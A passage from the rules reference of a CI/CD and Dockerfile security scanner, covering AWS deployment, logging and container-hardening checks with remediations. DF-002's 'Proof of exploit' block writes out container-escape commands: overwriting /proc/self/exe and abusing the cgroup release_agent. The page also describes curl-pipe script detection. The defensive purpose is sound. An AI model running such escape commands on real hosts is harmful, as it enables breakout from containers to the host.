**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`CD-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CD-001`: Automatic rollback on failure not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cd-001 }

**Evidences:** [`ESF-C-ROLLBACK`](#ctrl-esf-c-rollback) Automated rollback on deployment failure or alarm.

**How this is detected.** Without ``autoRollbackConfiguration``, a CodeDeploy deployment that fails leaves the failed revision live until an operator notices. The default is opt-in, not opt-out, deployments fail-open, not fail-back.

**Recommendation.** Enable autoRollbackConfiguration with at least the DEPLOYMENT_FAILURE event so CodeDeploy automatically reverts to the last successful revision when a deployment fails.

**Source:** [`CD-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CD-002`: AllAtOnce deployment config, no canary or rolling strategy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cd-002 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment, [`ESF-C-ROLLBACK`](#ctrl-esf-c-rollback) Automated rollback on deployment failure or alarm, [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** AllAtOnce shifts 100% of traffic to the new revision in one step. There's no gradient to halt on if a CloudWatch alarm trips mid-rollout, the bad revision is already serving every request. Canary / linear configs introduce the shift-then-watch shape that lets monitors catch a regression before it's universal.

**Recommendation.** Switch to a canary or linear deployment configuration (e.g. CodeDeployDefault.LambdaCanary10Percent5Minutes or a custom rolling config) so that defects are caught before they affect all instances or traffic.

**Source:** [`CD-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CD-003`: No CloudWatch alarm monitoring on deployment group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cd-003 }

**Evidences:** [`ESF-C-DEPLOY-MON`](#ctrl-esf-c-deploy-mon) Monitor deployments with alarms / health checks.

**How this is detected.** Alarm-based rollback is what lets a canary configuration actually stop a bad deploy mid-flight. Without alarms wired into ``alarmConfiguration``, CodeDeploy's only signal that the deploy went wrong is the deployment-state machine itself, which doesn't notice an application-level regression. CD-002's canary work and this rule's alarm-based halt are paired.

**Recommendation.** Add CloudWatch alarms (e.g. error rate, 5xx count, latency p99) to the deployment group's alarmConfiguration. Enable automatic rollback on DEPLOYMENT_STOP_ON_ALARM to halt bad deployments.

**Source:** [`CD-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CF-001`: Inline credential parameter on a CloudFormation resource <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cf-001 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** See [`CloudFormation` provider documentation](../providers/cloudformation.md) for the rule's detection mechanism.

**Recommendation.** See [`CloudFormation` provider documentation](../providers/cloudformation.md) for the recommended remediation.

**Source:** [`CF-001`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).

### `CF-002`: CloudFormation parameter declares a default secret value <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cf-002 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** See [`CloudFormation` provider documentation](../providers/cloudformation.md) for the rule's detection mechanism.

**Recommendation.** See [`CloudFormation` provider documentation](../providers/cloudformation.md) for the recommended remediation.

**Source:** [`CF-002`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).

### `CF-003`: CloudFormation resource opens a 0.0.0.0/0 ingress <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cf-003 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** See [`CloudFormation` provider documentation](../providers/cloudformation.md) for the rule's detection mechanism.

**Recommendation.** See [`CloudFormation` provider documentation](../providers/cloudformation.md) for the recommended remediation.

**Source:** [`CF-003`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).

### `CP-000`: CodePipeline API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-cp-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`CP-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-001`: No approval action before deploy stages <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-001 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration, [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** A pipeline that goes Source -> Build -> Deploy with no Approval action means every commit on the source branch ships, with no human ack between code-merged and code-running-in-prod. The Manual approval action is the intentional pause point, combine with CP-005 for production-tagged stages specifically.

**Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.

**Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-002`: Artifact store not encrypted with customer-managed KMS key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-002 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** The pipeline's S3 artifact store holds intermediate build outputs handed between stages. Default SSE-S3 (AES256) encrypts at rest but uses an AWS-owned key whose policy you can't scope. A customer-managed CMK gives the same key-policy + CloudTrail Decrypt-event audit story you'd apply to Lambda code, Secrets Manager, or any other build output.

**Recommendation.** Configure a customer-managed AWS KMS key as the encryptionKey for each artifact store. This enables key rotation, fine-grained access policies, and CloudTrail auditing of decrypt operations.

**Source:** [`CP-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-003`: Source stage using polling instead of event-driven trigger <span class="pg-sev pg-sev--low">LOW</span> { #detail-cp-003 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** ``PollForSourceChanges=true`` polls the source repo every minute or two. Beyond the API-quota and latency cost, polling produces a less-useful CloudTrail story than event-driven triggers. You see the poll calls, not the specific commit that started the pipeline. EventBridge / CodeCommit triggers tie each pipeline start to the originating event.

**Recommendation.** Set PollForSourceChanges=false and configure an Amazon EventBridge rule or CodeCommit trigger to start the pipeline on change. This reduces latency, API usage, and improves auditability.

**Known false positives.**

- ``PollForSourceChanges=true`` is the CFN default for CodeCommit sources, so legacy templates can carry the flag without an active design decision behind it. The rule is advisory (consider EventBridge / CodeStarSourceConnection) rather than a real risk; defaults to LOW confidence so CI gates default-filter it.

**Source:** [`CP-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-004`: Legacy ThirdParty/GitHub source action (OAuth token) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-004 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** The legacy ThirdParty/GitHub source-action provider stores a long-lived OAuth token in the pipeline's action configuration. The token has whatever scope the granting GitHub user has, never rotates, and isn't directly revocable from the AWS side. CodeConnections (formerly CodeStar Connections) replaces this with an AWS-managed connection that the GitHub user can revoke.

**Recommendation.** Migrate to owner=AWS, provider=CodeStarSourceConnection and reference a CodeConnections connection ARN.

**Source:** [`CP-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-005`: Production Deploy stage has no preceding ManualApproval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-005 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** The complement to CP-001: this rule fires only on stages whose name contains ``prod`` / ``production`` / ``live``. Even teams that intentionally skip approvals for dev / staging deploys usually want a human in the loop for a production-tagged target.

**Recommendation.** Add a ``Manual`` approval action immediately before any stage whose name contains ``prod`` / ``production``. CP-001 covers the generic case; this rule specifically looks at production-tagged stages where the blast radius of an unreviewed deploy is largest.

**Source:** [`CP-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CP-007`: CodePipeline v2 PR trigger accepts all branches <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-007 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** V2 pipelines added native PR triggers; without a ``branches.includes`` filter, any PR, including fork PRs from outside the org, fires the pipeline. The build stage runs with whatever IAM authority the pipeline's role carries, which is the full attack surface a fork-PR compromise can reach.

**Recommendation.** On V2 pipelines, add an ``includes`` filter under the trigger's ``branches`` block (and optionally ``pullRequest.events``) so only PRs targeting specific branches run. Without a filter, any fork-PR can execute the pipeline's build and deploy stages.

**Source:** [`CP-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CT-000`: CloudTrail API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ct-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`CT-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CT-001`: No active CloudTrail trail in region <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ct-001 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** CloudTrail is the only AWS-native source of record for management-plane API calls. A region with no active trail blinds incident responders: a pipeline compromise is invisible once the in-memory CloudWatch buffer rolls over.

**Recommendation.** Create a CloudTrail trail that logs management events in this region and start logging. Without a trail, CodeBuild/CodePipeline/IAM API activity, including credential changes during a compromise, has no durable audit record.

**Source:** [`CT-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CT-002`: CloudTrail log-file validation disabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ct-002 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** CloudTrail logs are S3 objects. Without log-file validation, an attacker with ``s3:PutObject`` on the trail bucket can edit log files to remove evidence of their activity, and there's no digest to compare against. With validation on, every hour of logs is summarized in a signed digest file under ``CloudTrail-Digest/``.

**Recommendation.** Set ``LogFileValidationEnabled=true`` on every CloudTrail trail. Log validation produces a signed digest file alongside each log object so tampering by an attacker who also has S3 write access can be detected after the fact.

**Source:** [`CT-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CT-003`: CloudTrail trail is not multi-region <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ct-003 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** An attacker who knows your CloudTrail trail is regional deliberately operates from a different region. Multi-region trails capture management events from every region into a single trail, closing the gap without you having to enumerate which regions you actually use.

**Recommendation.** Convert the trail to a multi-region trail. A single-region trail misses activity in every other region, an attacker aware of the scope can drive reconnaissance or persistence from an unlogged region.

**Source:** [`CT-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CW-001`: No CloudWatch alarm on CodeBuild FailedBuilds metric <span class="pg-sev pg-sev--low">LOW</span> { #detail-cw-001 }

**Evidences:** [`ESF-C-DEPLOY-MON`](#ctrl-esf-c-deploy-mon) Monitor deployments with alarms / health checks.

**How this is detected.** Failure-rate signals are how on-call learns about an unfamiliar build crashing in a loop, an attacker probing the build environment, or a CI quota being exhausted. CloudWatch captures the ``FailedBuilds`` metric automatically, the alarm is the missing fan-out.

**Recommendation.** Create a CloudWatch alarm on the ``AWS/CodeBuild`` namespace ``FailedBuilds`` metric (aggregated or per-project). Without one, repeated build failures during a compromise, or a runaway fork-PR build, won't reach on-call.

**Source:** [`CW-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CWL-000`: CloudWatch Logs API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-cwl-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`CWL-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CWL-001`: CodeBuild log group has no retention policy <span class="pg-sev pg-sev--low">LOW</span> { #detail-cwl-001 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** CloudWatch Logs created by CodeBuild default to ``Never Expire`` retention. Build logs frequently echo secrets accidentally (a `set -x` script, an `env` dump in an error trace), so unbounded retention extends the exposure window for every secret a build has ever leaked. A short-but-finite retention also caps cost.

**Recommendation.** Set a retention policy on every ``/aws/codebuild/*`` log group. The default is 'Never Expire', which both racks up storage cost and keeps logs indefinitely past any compliance window.

**Source:** [`CWL-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CWL-002`: CodeBuild log group not KMS-encrypted <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cwl-002 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** CloudWatch Logs default encryption is service-managed, fine for confidentiality, but no audit trail or scoping. Build logs are a frequent secret-leak vector (CWL-001's rationale extended), so the same key-policy + Decrypt-event story you'd apply to S3 / Lambda / Secrets Manager is warranted here too.

**Recommendation.** Associate a customer-managed KMS key with every ``/aws/codebuild/*`` log group via ``associate-kms-key``. Logs often contain secret material accidentally echoed by builds; encrypting them with a CMK means the key policy controls who can read the logs, not just S3/CloudWatch IAM.

**Source:** [`CWL-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `DF-001`: FROM image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Reuses ``_primitives/image_pinning.classify`` so the floating-tag semantics match GL-001 / JF-009 / ADO-009 / CC-003. ``PINNED_TAG`` (e.g. ``python:3.12.1-slim``) is treated as unpinned here too, only an explicit ``@sha256:`` survives, since the tag is mutable on the registry side.

**Recommendation.** Resolve every base image to its current digest (``docker buildx imagetools inspect <ref>`` prints it) and pin via ``FROM repo@sha256:<digest>``. Automate refreshes with Renovate or Dependabot. A floating tag (``:latest``, ``:3``, no tag) silently swaps the build base under every rebuild.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- Docker Hub typosquatting / namespace-takeover incidents (2017 onward): docker-library Sysdig and Aqua research documented thousands of malicious images uploaded under near-miss names (``alpine`` vs ``alphine``, etc.) and occasional namespace recoveries shipping crypto-miners downstream. Digest-pinned consumers are immune; tag-pinned consumers pull whatever sits under the name today.
- Codecov ``codecov/codecov-action`` tag-mutation incident (post-Codecov-Bash-uploader compromise): the upstream rotated the action's ``@v3`` tag during the fallout, and consumers pinning to the tag silently re-ran a different build than before. Digest pinning would have surfaced the change as a checksum mismatch instead of a silent swap.

**Source:** [`DF-001`](../providers/dockerfile.md#df-001) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-002`: Container runs as root (missing or root USER directive) <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-002 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Multi-stage builds: only the final stage matters for runtime identity, since intermediate stages don't ship. The check scopes USER to the *last* FROM through end-of-file.

**Recommendation.** Add a ``USER <non-root>`` directive after package install steps (e.g. ``USER 1001`` or ``USER appuser``). Running as root inside a container is not isolation, a kernel CVE, a misconfigured mount, or a mis-applied capability collapses straight into the host.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [CVE-2019-5736](https://www.cve.org/CVERecord?id=CVE-2019-5736) (runC host breakout): a malicious container running as root could overwrite the host's runC binary and compromise every other container on the node. Non-root containers were not exploitable.
- [CVE-2022-0492](https://www.cve.org/CVERecord?id=CVE-2022-0492) (cgroups v1 escape via release_agent): root inside a container with CAP_SYS_ADMIN could write to the host's release_agent file and execute arbitrary host code. Containers running as a non-root UID side-stepped the exploit class entirely.

**Proof of exploit.**

```
# Vulnerable: image runs as root by default (no USER set).
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3
COPY app.py /app/
CMD ["python3", "/app/app.py"]

# Attack: when the container is breached (RCE in the app, a
# kernel CVE, a misconfigured mount), the attacker runs as
# UID 0. From there:
#
#   # CVE-2019-5736 path: overwrite /proc/self/exe to corrupt
#   # the host's runC binary — every container on the node
#   # the next launch executes attacker code on the host:
#   echo '#!/bin/sh\n/attacker_payload' > /proc/self/exe
#
#   # CVE-2022-0492 path: cgroup release_agent escape:
#   mkdir /tmp/cg && mount -t cgroup -o memory cgroup /tmp/cg
#   echo '/payload' > /tmp/cg/release_agent
#   echo 1 > /tmp/cg/notify_on_release
#
# A non-root UID makes both paths fail at the first syscall.

# Safe: drop to a dedicated unprivileged user.
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3 \
  && useradd --uid 1001 --create-home app
COPY --chown=app:app app.py /app/
USER 1001
CMD ["python3", "/app/app.py"]
```

**Source:** [`DF-002`](../providers/dockerfile.md#df-002) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-003`: ADD pulls remote URL without integrity verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-003 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** ``ADD`` with a URL is the historical Dockerfile footgun: it fetches at *build* time over HTTP(S) with no checksum and no signature, and the registry tag does not pin the source. A tampered server or DNS hijack silently swaps the content. ``COPY`` is for local files; ``RUN curl + verify`` is for remote ones.

**Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.

**Known false positives.**

- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.

**Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Reuses ``_primitives/remote_script_exec.scan`` so the vocabulary matches the equivalent CI-side rules (GHA-016, GL-016, BB-012, ADO-016, CC-016, JF-016).

**Recommendation.** Download to a file, verify checksum or signature, then execute. ``curl -fsSL <url> -o /tmp/x.sh && sha256sum -c <(echo '<digest>  /tmp/x.sh') && bash /tmp/x.sh``. Vendor installers from well-known hosts (rustup.rs, get.docker.com, ...) are reported with vendor_trusted=true so reviewers can calibrate.

**Source:** [`DF-004`](../providers/dockerfile.md#df-004) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-005`: RUN uses shell-eval (eval / sh -c on a variable / backticks) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-005 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Reuses ``_primitives/shell_eval.scan``, same primitive used by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so the safe / unsafe vocabulary matches across the tool.

**Recommendation.** Replace ``eval "$X"`` and ``sh -c "$X"`` with explicit argv invocations. If the build genuinely needs a templated command, render it through a sealed config file or use ``RUN --mount=type=secret`` with explicit input. ``$( … )`` / backticks should never wrap interpolated user-controlled vars inside a Dockerfile.

**Source:** [`DF-005`](../providers/dockerfile.md#df-005) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-006`: ENV or ARG carries a credential-shaped literal value <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-006 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS keys outright (the literal AWS access-key shape) and credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal.

**Recommendation.** Never hard-code credentials in a Dockerfile. ``ENV`` values are baked into the image layer history, even if the value is later overwritten, ``docker history --no-trunc`` reads the original. Use ``RUN --mount=type=secret`` for build-time secrets or runtime env injection (``docker run -e SECRET=…``) for runtime ones. Rotate any secret already exposed.

**Source:** [`DF-006`](../providers/dockerfile.md#df-006) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-007`: No HEALTHCHECK directive declared <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-007 }

**Evidences:** [`ESF-C-DEPLOY-MON`](#ctrl-esf-c-deploy-mon) Monitor deployments with alarms / health checks.

**How this is detected.** This is a defense-in-depth signal rather than an exploitation indicator, severity is LOW. A missing healthcheck doesn't create a vulnerability on its own, but downstream orchestrators (Kubernetes, ECS, Compose) cannot recover an unhealthy container they cannot detect, and that turns a soft failure (slow leak, deadlock) into a stale-process incident.

**Recommendation.** Declare a ``HEALTHCHECK`` so the orchestrator can detect stuck or zombie containers. Example: ``HEALTHCHECK --interval=30s --timeout=5s --retries=3 CMD curl -fsS http://localhost/healthz || exit 1``. Skip this for builder/multi-stage intermediate images, only the runtime image needs one.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-007`](../providers/dockerfile.md#df-007) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-008`: RUN invokes docker --privileged or escalates capabilities <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-008 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Mirrors GHA-017 / GL-017 / BB-013 / ADO-017 / CC-017 / JF-017 (``docker run --privileged`` in CI scripts) but at Dockerfile build time. The risk is subtler: a privileged RUN step doesn't directly elevate the resulting image, but it gives the build host's docker daemon a chance to escape, and any tampered base image can exploit the elevated build.

**Recommendation.** A Dockerfile build step almost never legitimately needs ``--privileged`` or ``--cap-add SYS_ADMIN`` / ``ALL``. If the build genuinely requires elevated capabilities (e.g. compiling a kernel module), do it in a sealed builder image and ``COPY`` the artifact out, don't carry the privileged execution into the runtime image.

**Source:** [`DF-008`](../providers/dockerfile.md#df-008) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-009`: ADD used where COPY would suffice <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-009 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Pure-local ``ADD <path> <dest>`` is functionally identical to ``COPY``, but ships extra-feature surface (URL fetch, tarball auto-extract) that adds nothing and turns a benign-looking filename change into a behavior change. The Docker docs have recommended ``COPY`` for non-URL inputs since 2014.

**Recommendation.** Replace ``ADD ./local`` with ``COPY ./local``. ``ADD`` has two implicit behaviors that make it the wrong default. It fetches HTTP(S) URLs and it auto-extracts ``.tar`` / ``.tar.gz`` archives. Both are easy to invoke accidentally and neither is reproducible. Reserve ``ADD`` for a deliberate URL-pull (covered by DF-003) or an explicit tarball extract.

**Source:** [`DF-009`](../providers/dockerfile.md#df-009) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-010`: apt-get dist-upgrade / upgrade pulls unknown package versions <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-010 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Running ``apt-get upgrade`` (or ``dist-upgrade``) inside a Dockerfile is the classic pet-vs-cattle anti-pattern. Two back-to-back builds with the same Dockerfile can produce different images because the upstream archive moved between the two ``RUN`` invocations. ``dist-upgrade`` additionally relaxes dependency resolution. It can install / remove arbitrary packages to satisfy upgrades, so the resulting image's package set isn't even bounded by what the Dockerfile declares.

**Recommendation.** Drop the upgrade step. Build on a recent base image instead (rebuild your image when the base image gets a security patch, pin the base by digest per DF-001 so the rebuild is deterministic). ``apt-get install pkg=<version>`` for specific packages stays reproducible; ``upgrade`` / ``dist-upgrade`` does not.

**Source:** [`DF-010`](../providers/dockerfile.md#df-010) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-011`: Package manager install without cache cleanup in same layer <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-011 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Each Dockerfile ``RUN`` produces a layer. Installing packages in one layer and cleaning the cache in a later layer leaves the cache files in the lower layer forever, final image size is unchanged and the residual files broaden the attack surface (e.g. apt's signed-by keys, package metadata). The fix is layout, not behavior: do install + cleanup in the same ``RUN``.

**Recommendation.** Combine the install and cleanup into the same ``RUN`` so the cache lands in a single layer that gets discarded together. Idiomatic pattern: ``RUN apt-get update && apt-get install -y <pkgs> && rm -rf /var/lib/apt/lists/*``. Equivalent forms: ``apk add --no-cache <pkgs>``, ``dnf install -y … && dnf clean all``, ``yum install -y … && yum clean all``, ``zypper -n in … && zypper clean -a``.

**Source:** [`DF-011`](../providers/dockerfile.md#df-011) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-012`: RUN invokes sudo <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-012 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** ``sudo`` inside a Dockerfile is almost always a copy-paste from a host README. Its presence usually means one of three things, all of them wrong: (a) the build is silently running as root and the operator misread it, (b) the image carries an unrestricted ``sudoers`` line that a runtime escape can abuse, or (c) the package install chain depends on TTY-aware ``sudo`` behavior that breaks under non-TTY ``docker build``. None of these cases benefit from keeping the directive.

**Recommendation.** Drop ``sudo`` from the ``RUN``. Either the build is already running as root (the default before any ``USER`` directive), in which case ``sudo`` is no-op noise, or the build switched to a non-root ``USER`` and needs root for a specific step, in which case temporarily revert with ``USER root`` for that ``RUN`` and switch back afterward.

**Source:** [`DF-012`](../providers/dockerfile.md#df-012) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-013`: EXPOSE declares sensitive remote-access port <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-013 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** ``EXPOSE`` is documentation, not a firewall. It doesn't actually open the port. But ``EXPOSE 22`` is a strong signal the image runs sshd, and any remote-access daemon inside the container blows up the threat model: now you have an extra auth surface, an extra service to keep patched, and a way for a compromised app to phone home from the outside. The container runtime / orchestrator's exec path covers every operational use case sshd traditionally served.

**Recommendation.** Remove the ``EXPOSE`` line for the remote-access port. If the operator legitimately needs to reach the container, exec into it (``docker exec`` / ``kubectl exec``). That path uses the orchestrator's auth and audit, doesn't open a network port, and doesn't ship an extra daemon inside the image. Containers should not run sshd / telnetd / ftpd / rsh-d / vncd / RDP alongside the application.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-013`](../providers/dockerfile.md#df-013) in the [Dockerfile provider](../providers/dockerfile.md).

